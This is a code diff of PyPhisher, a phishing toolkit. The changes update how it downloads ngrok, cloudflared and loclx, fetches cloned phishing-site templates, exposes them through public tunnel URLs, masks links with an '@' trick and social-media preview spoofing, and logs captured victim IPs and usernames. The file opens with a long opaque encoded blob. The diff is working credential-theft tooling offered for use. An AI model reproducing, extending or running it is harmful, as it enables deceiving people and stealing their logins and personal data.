RMZWVSXDVSX6TK6HKVKG5FE67NLHE3CJTLSLXZFXUIPNTWE67K4WU6YKSDKJLPXO6OJLJZ56RSBHPGYNP7ZRLSJ3L2XFWNYAPJKK5NRS5IJM6LH3ABN2LLLQX3HKYUYZWCV7D4Q4HVN7S3JJCT3R2JCCM2WS72NYOZVGPSX6GIZGR5V4IRKPJ4DRR6Z3ABM3EHFJRYV4E7MVBVTLZHZ6QZQ47K56JVJW2PSYORMM4FLRFT6ZBMWXWKRZPGGIPY5V2C7KQ6GO2XWUOPQKBLXDFJM5Z7ES7N42XQKHGPYXGRXNSHDGWDXZJ5ETLAHYHE73YGFGLFBAFPSWBV3KTH77IQRGI4FJYYVWNZ2RK5R6DTMMTZLI3IYA5SNTXV4QWH65ENZKZUXI2SV557R64TVFLFL5MRGFNUDV2EJB3FXLGTBF7L3EGRYKVC6ZBFW3WFUUJ7ZFKBT6RN53LPMYREYXTZ5G46TODO3TUWHAGGU6I5RY3FPRPV4BB5TKEPNTS7KWFKPWMS7RLR3EZYO65Q3VIZCZT2PVPRXTQZ5GSUCLCDSSOD3SA56VUF64HWMTXCMAVES5XMZJZBF55ZMJ3JJSYT4ETS34ZH6WFJG6OY7EP7DN23WKTN6LGWN23SGS62X5ZVGMDISYYJYJM6JO5SVWKYI5FNLCN5KJZVQVC3TXKERSTZ3ENC56ADLOEDBT4WTDFHJKS22BLNLXEQTVP6EETK2SXMGSWOUPTQTIRT7CT6NDEEB4GF4CWX3LTLLOGIU6PMZKXH2UISL55WJKK3KS52UGS4PH4DLLPTGIGUELE64LZIV5JZJCUPEY73DX777P625T777P6ZZ3777HV7Y2XGLC6T4LVDRIPPW45P4AV3OQQRCMJQA24ARYAAQ4CVUR3CS2R5JEMLSLWJKW2BOCP'))
 
 # Write/Append errors to error file
 def write_error(e):
-    if isfile(error_file):
-        with open(error_file, "a") as error_log:
-            error_log.write(str(e)+"\n")
-    else:
-        with open(error_file, "w") as error_log:
-            error_log.write(str(e)+"\n")
+    with open(error_file, "a") as error_log:
+        error_log.write(str(e)+"\n")
 
 # Polite Exit
 def pexit():
@@ -268,14 +273,14 @@ def killer():
 
 # Set up ngrok authtoken to work with ngrok links
 def ngrok_token():
-    while not isfile(f"{root}/.ngrok2/ngrok.yml"):
+    while not isfile(f"{root}/.config/ngrok/ngrok.yml"):
         token = input(f"\n{ask}Enter your ngrok authtoken (write 'help' for instructions): {green}")
         if token!="":
             if token=="help":
                 sprint(ngrok_help, 0.01)
                 sleep(3)
             else:
-                system(f"cd $HOME/.ngrokfolder && ./ngrok authtoken {token}")
+                system(f"cd $HOME/.tunneler && ./ngrok config add-authtoken {token}")
                 break
         else:
             print(f"\n{error}No authtoken!")
@@ -334,12 +339,14 @@ def customfol():
 # Update of PyPhisher
 def updater():
     internet()
+    if not exists("files/pyphisher.gif"):
+        return
     try:
         git_ver = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/version.txt").text.strip()
     except Exception as e:
         write_error(e)
         git_ver = version
-    if (version != git_ver and git_ver != "404: Not Found"):
+    if git_ver != "404: Not Found" and float(git_ver) > float(version):
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         system("clear")
@@ -378,85 +385,87 @@ def prerequiments():
         exit(1)
     killer()
     osinfo = uname()
-    # architecture = popen("uname -m").read().strip()
-    # platform = popen("uname").read().strip()
     platform = osinfo.system
     architecture = osinfo.machine
-    if not exists(f"{root}/.ngrokfolder"):
-        mkdir(f"{root}/.ngrokfolder")
-    if not exists(f"{root}/.cffolder"):
-        mkdir(f"{root}/.cffolder")
-    if not isfile(f"{root}/.ngrokfolder/ngrok") or (brew and not ngrok):
-        sprint(f"\n{info}Downloading ngrok.....{nc}")
+    if not exists(f"{root}/.tunneler"):
+        mkdir(f"{root}/.tunneler")
+    isngrok = isfile(f"{root}/.tunneler/ngrok")
+    iscloudflared = isfile(f"{root}/.tunneler/cloudflared")
+    isloclx = isfile(f"{root}/.tunneler/loclx")
+    if brew:
+        if not ngrok:
+            system("brew install ngrok/ngrok/ngrok")
+        if not cloudflared:
+            system("brew install cloudflare/cloudflare/cloudflared")
+        if not loclx:
+            system("brew install localxpose")
+    else:
+        system("rm -rf ngrok.zip ngrok.tgz cloudflared.tgz cloudflared loclx.zip")
         internet()
-        system("rm -rf ngrok.zip ngrok.tgz")
         if platform.find("Linux")!=-1:
             if architecture.find("aarch64")!=-1:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz", "ngrok.tgz")
-                extract("ngrok.tgz", f"{root}/.ngrokfolder")
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
+                if not iscloudflared:
+                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{root}/.tunneler/cloudflared")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
+            elif architecture.find("arm")!=-1:
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
+                if not iscloudflared:
+                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{root}/.tunneler/cloudflared")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
+            elif architecture.find("x86_64")!=-1:
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
+                if not iscloudflared:
+                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{root}/.tunneler/cloudflared")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
+            else:
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
+                if not iscloudflared:
+                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{root}/.tunneler/cloudflared")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
+            if isfile("ngrok.tgz"):
+                extract("ngrok.tgz", f"{root}/.tunneler")
                 remove("ngrok.tgz")
-            elif architecture.find("arm")!=-1:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{root}/.ngrokfolder")
-                remove("ngrok.zip")
-            elif architecture.find("x86_64")!=-1:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{root}/.ngrokfolder")
-                remove("ngrok.zip")
-            else:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{root}/.ngrokfolder")
-                remove("ngrok.zip")
         elif platform.find("Darwin")!=-1:
             if architecture.find("x86_64")!=-1:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{root}/.ngrokfolder")
-                remove("ngrok.zip")
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
+                    extract("ngrok.zip", f"{root}/.tunneler")
+                    remove("ngrok.zip")
+                if not iscloudflared:
+                    download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
+                    extract("cloudflared.tgz", f"{root}/.tunneler")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
             elif architecture.find("arm64")!=-1:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{root}/.ngrokfolder")
-                remove("ngrok.zip")
+                if not isngrok:
+                    download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
+                    extract("ngrok.zip", f"{root}/.tunneler")
+                    remove("ngrok.zip")
+                if not iscloudflared:
+                    print(f"{error}Device architecture unknown. Download cloudflared manually!")
+                if not isloclx:
+                    download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
             else:
-                print(f"{error}Device architecture unknown. Download ngrok manually!")
-                system("brew install ngrok/ngrok/ngrok")
+                print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
                 sleep(3)
         else:
             print(f"{error}Device not supported!")
             exit(1)
-        if isfile(f"{root}/.ngrokfolder/ngrok"):
-            if sudo:
-                system("sudo chmod +x $HOME/.ngrokfolder/ngrok")
-            else:
-                system("chmod +x $HOME/.ngrokfolder/ngrok")
-    if not isfile(f"{root}/.cffolder/cloudflared") or (brew and not cloudflared):
-        sprint(f"\n{info}Downloading cloudflared.....{nc}")
-        internet()
-        system("rm -rf cloudflared cloudflared.tgz")
-        if platform.find("Linux")!=-1:
-            if architecture.find("aarch64")!=-1:
-                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{root}/.cffolder/cloudflared")
-            elif architecture.find("arm")!=-1:
-                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{root}/.cffolder/cloudflared")
-            elif architecture.find("x86_64")!=-1:
-                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{root}/.cffolder/cloudflared")
-            else:
-                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{root}/.cffolder/cloudflared")
-        elif platform.find("Darwin")!=-1:
-            if architecture.find("x86_64")!=-1:
-                download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
-                extract("cloudflared.tgz", f"{root}/.cffolder")
-            else:
-                print(f"{error}Device architecture unknown. Download cloudflared manually!")
-                system("brew install cloudflare/cloudflare/cloudflared")
-                sleep(3)
-        else:
-            print(f"{error}Device not supported!")
-            exit(1)
-        if isfile(f"{root}/.cffolder/cloudflared"):
-            if sudo:
-                system("sudo chmod +x $HOME/.cffolder/cloudflared")
-            else:
-                system("chmod +x $HOME/.cffolder/cloudflared")
+        if isfile("loclx.zip"):
+            extract("loclx.zip", f"{root}/.tunneler")
+            remove("loclx.zip")
+        for tunneler in tunnelers:
+            if isfile(f"{root}/.tunneler/{tunneler}"):
+                system(f"chmod +x $HOME/.tunneler/{tunneler}")
     for process in processes:
         if system(f"pidof {process} > /dev/null 2>&1")==0:
             sprint(f"{error}Previous {process} still running! Please restart terminal and try again{nc}")
@@ -482,31 +491,36 @@ def prerequiments():
 
 # 3rd function checking requirements and download files 
 def requirements(folder):
-    if isfile(f"{root}/.websites/version.txt"):
-        with open(f"{root}/.websites/version.txt", "r") as sites_file:
+    if isfile("websites.zip"):
+        system(f"rm -rf {websites_dir}/*")
+        extract("websites.zip", websites_dir)
+        remove("websites.zip")
+    if exists("sites"):
+        system(f"rm -rf {websites_dir}")
+        system(f"cp -r sites {websites_dir}")
+    if isfile(f"{websites_dir}/version.txt"):
+        with open(f"{websites_dir}/version.txt", "r") as sites_file:
             zipver=sites_file.read().strip()
-            if zipver!=version:
-                sprint(f"\n{info}Downloading required files.....\n{nc}")
+            if float(version) > float(zipver):
                 download(websites_url, "websites.zip")
     else:
-        sprint(f"\n{info}Downloading required files.....\n{nc}")
         download(websites_url, "websites.zip")
     if isfile("websites.zip"):
-        system("rm -rf $HOME/.websites/*")
-        extract("websites.zip", f"{root}/.websites")
+        system(f"rm -rf {websites_dir}/*")
+        extract("websites.zip", websites_dir)
         remove("websites.zip")
+    site = f"{websites_dir}/{folder}"
     if exists(f"{root}/.websites/{folder}"):
-        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
+        system(f"cp -r {site}/* $HOME/.site")
     else:
         internet()
-        sprint(f"\n{info}Downloading required files.....\n{nc}")
         system("rm -rf site.zip")
         download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
-        if not exists(f"{root}/.websites/{folder}"):
-            mkdir(f"{root}/.websites/{folder}")
-        extract("site.zip", f"{root}/.websites/{folder}")
+        if not exists(f"{websites_dir}/{folder}"):
+            mkdir(site)
+        extract("site.zip", site)
         remove("site.zip")
-        system(f"cp -r $HOME/.websites/{folder}/* $HOME/.site")
+        system(f"cp -r {site}/* $HOME/.site")
     server()
 
 # Start server and tunneling
@@ -533,18 +547,21 @@ def server():
         pexit()
     sprint(f"\n{info2}Initializing tunnelers at same address.....")
     internet()
-    system("rm -rf $HOME/.cffolder/log.txt")
+    system('find "$HOME/.tunneler" -name "*.log" -delete')
     if system("command -v termux-chroot > /dev/null 2>&1")==0:
-        system(f"cd $HOME/.ngrokfolder && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
-        system(f"cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
-    # Use installed ngrok and cloudflared in mac
-    elif brew and ngrok and cloudflared:
+        system(f"cd $HOME/.tunneler && termux-chroot ./ngrok http {local_url} > /dev/null 2>&1 &")
+        system(f"cd $HOME/.tunneler && termux-chroot ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
+        system(f"echo 'cd $HOME/.tunneler && termux-chroot ./loclx tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
+    # Use installed ngrok and cloudflared and localxpose in mac
+    elif brew and ngrok and cloudflared and loclx:
         system(f"ngrok http {local_url} > /dev/null 2>&1 &")
-        system(f"cd $HOME/.cffolder && cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
+        system(f"cd $HOME/.tunneler && cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
+        system(f"echo 'cd $HOME/.tunneler && localxpose tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
     else:
-        system(f"cd $HOME/.ngrokfolder && ./ngrok http {local_url} > /dev/null 2>&1 &")
-        system(f"cd $HOME/.cffolder && ./cloudflared tunnel -url {local_url} --logfile log.txt > /dev/null 2>&1 &")
-    sleep(9)
+        system(f"cd $HOME/.tunneler && ./ngrok http {local_url} > /dev/null 2>&1 &")
+        system(f"cd $HOME/.tunneler && ./cloudflared tunnel -url {local_url} --logfile cf.log > /dev/null 2>&1 &")
+        system(f"echo 'cd $HOME/.tunneler && ./loclx tunnel http --to :{port} &> loclx.log &' > .loclx && bash .loclx && rm -rf .loclx")
+    sleep(10)
     try:
         ngrok_api = get("http://127.0.0.1:4040/api/tunnels").json()
         ngrok_url = ngrok_api["tunnels"][0]["public_url"]
@@ -555,50 +572,95 @@ def server():
         ngrok_success=True
     else:
         ngrok_success=False
-    if isfile(f"{root}/.cffolder/log.txt"):
-        cf_url=popen("cat $HOME/.cffolder/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read().strip()
-    else:
-        cf_url=""
-        sprint(f"\n{error}Cloudflared failed to start!{nc}")
-    if cf_url.find("cloudflare")!=-1:
-        cf_success=True
-    else:
-        cf_success=False
-    if ngrok_success and cf_success:
+    for i in range(10):
+        if isfile(f"{root}/.tunneler/cf.log"):
+            cf_url = popen("cat $HOME/.tunneler/cf.log | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'").read().strip()
+            sleep(1)
+        else:
+            cf_url = ""
+            sprint(f"\n{error}Cloudflared failed to start!{nc}")
+        if cf_url.find("cloudflare")!=-1:
+            cf_success=True
+            break
+        else:
+            cf_success=False
+    for i in range(10):
+        if isfile(f"{root}/.tunneler/loclx.log"):
+            loclx_url = "https://" + popen("cat $HOME/.tunneler/loclx.log | grep -o '[-0-9a-z]*\.loclx.io'").read().strip()
+            sleep(1)
+        else:
+            loclx_url = ""
+            sprint(f"\n{error}Loclx failed to start!{nc}")
+        if loclx_url.find("loclx")!=-1:
+            loclx_success=True
+            break
+        else:
+            loclx_success=False
+    if ngrok_success and cf_success and loclx_success:
+        print(f"\n{success}Ngrok, Cloudflared and Loclx have started successfully!")
+        url_manager(cf_url, "1", "2")
+        url_manager(ngrok_url, "3", "4")
+        url_manager(loclx_url, "5", "6")
+        if tunneler.lower() == "ngrok":
+            cuask(ngrok_url)
+        elif tunneler.lower() == "loclx":
+            cuask(loclx_url)
+        else:
+            cuask(cf_url)
+    elif ngrok_success and cf_success and not loclx_success:
+        print(f"\n{success}Ngrok and Cloudflared have started successfully!")
         url_manager(cf_url, "1", "2")
         url_manager(ngrok_url, "3", "4")
         if tunneler.lower() == "ngrok":
             cuask(ngrok_url)
         else:
             cuask(cf_url)
-    elif cf_success and not ngrok_success:
+    elif loclx_success and cf_success and not ngrok_success:
+        print(f"\n{success}Cloudflared and Loclx have started successfully!")
         url_manager(cf_url, "1", "2")
-        cuask(cf_url)
-    elif ngrok_success and not cf_success:
+        url_manager(loclx_url, "3", "4")
+        if tunneler.lower() == "loclx":
+            cuask(loclx_url)
+        else:
+            cuask(cf_url)
+    elif ngrok_success and loclx_success and not cf_success:
+        print(f"\n{success}Ngrok and Loclx have started successfully!")
+        url_manager(ngrok_url, "1", "2")
+        url_manager(loclx_url, "3", "4")
+        if tunneler.lower() == "ngrok":
+            cuask(ngrok_url)
+        else:
+            cuask(loclx_url)
+    elif ngrok_success and not cf_success and not loclx_success:
+        print(f"\n{success}Ngrok has started successfully!")
         url_manager(ngrok_url, "1", "2")
         cuask(ngrok_url)
-    elif not (cf_success and ngrok_success):
+    elif cf_success and not ngrok_success and not loclx_success:
+        print(f"\n{success}Cloudflared has started successfully!")
+        url_manager(cf_url, "1", "2")
+        cuask(cf_url)
+    elif loclx_success and not ngrok_success and not cf_success:
+        print(f"\n{success}Loclx has started successfully!")
+        url_manager(loclx_url, "1", "2")
+        cuask(loclx_url)
+    else:
         sprint(f"\n{error}Tunneling failed! Use your own tunneling service on port {port}!{nc}")
         waiter()
-    else:
-        sprint(f"\n{error}Unknown error!")
-        pexit()
-
 
 # Output urls
 def url_manager(url, num1, num2):
     global mask
     if num1=="1":
-        sprint(f"\n{success}Your urls are given below:")
+        sprint(f"\n{info}Your urls are given below:")
     print(f"\n{info2}URL {num1} > {yellow}{url}")
     print(f"{info2}URL {num2} > {yellow}{mask}@{url.replace('https://','')}")
 
 
 # Ask to mask url and shadow url
 def cuask(url):
-    metaurl = input(f"\n{ask}{bcyan}Enter shadow url(for social media preview)[press enter to skip] : {green}")
+    metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
     write_meta(metaurl)
-    cust = input(f"\n{ask}{bcyan}Wanna try custom link?(y or press enter to skip) > ")
+    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
     if not cust=="":
         masking(url)
     waiter()
@@ -655,7 +717,6 @@ def waiter():
                 remove(f"{root}/.site/usernames.txt")
             sleep(0.75)
             if isfile(f"{root}/.site/ip.txt"):
-                print(logo)
                 print(f"\n\n{success}{bgreen}Victim IP found!\n\007")
                 show_file_data(f"{root}/.site/ip.txt")
                 system("cat $HOME/.site/ip.txt >> ip.txt")
